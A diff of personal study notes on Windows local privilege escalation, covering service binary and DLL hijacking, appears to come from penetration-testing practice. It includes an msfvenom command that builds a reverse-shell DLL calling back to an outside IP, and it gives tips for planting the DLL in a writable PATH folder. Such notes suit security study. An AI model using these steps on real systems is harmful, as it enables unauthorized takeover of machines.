@@ -61,6 +61,7 @@
 ## Sevice binary
 - May require RDP to use
 - ``` Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} ``` get WMI (Windows Management Instrumentation)services and see starting path
+- [Powershell]: ```  Get-Service ```
 - check if have customed path ``` --default-files```
 - [*Useful*] Check permission with ``` icacls {path} ```
 - Mask 	Permissions
@@ -90,6 +91,7 @@
 - ``` Start-Process powershell -Verb runAs ``` run as administrator
 
 ## DLL
+- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
 - Hard to hijack since the load order is like this: 
     ``` 
         1. The directory from which the application loaded.
@@ -101,6 +103,9 @@
     ``` 
 - Process monitor maybe disabled for some user -> (still need priv) copy procmon binary to local and run 
 - can load rev shell inside dll e.g. ``` msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll```
+### For step 6: 
+- find ``` echo %PATH% ``` possible injectable folder and put the dll there
+- *Remember to restart if possible
 
 ### Procmon tool
 - start and filter xxx.exe 
